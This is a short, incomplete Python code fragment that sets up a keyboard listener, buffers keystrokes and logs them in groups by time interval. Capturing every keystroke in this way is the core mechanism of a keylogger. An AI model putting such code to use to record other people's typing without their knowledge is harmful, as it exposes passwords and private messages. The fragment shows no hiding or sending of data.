...
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    ...
    keystroke_buffer = []
    last_time = time.time()
    grouping_interval = 0.5  # Time interval in seconds to group keystrokes
    
    def log_keystrokes():
        global last_time
        current_time = time.time()
        
        # Check if the time since the last log is greater than the grouping interval
        if current_time - last_time >= grouping_interval:
            if keystroke_buffer:
                logging.info(' '.join(keystroke_buffer))  # Log the grouped keystrokes
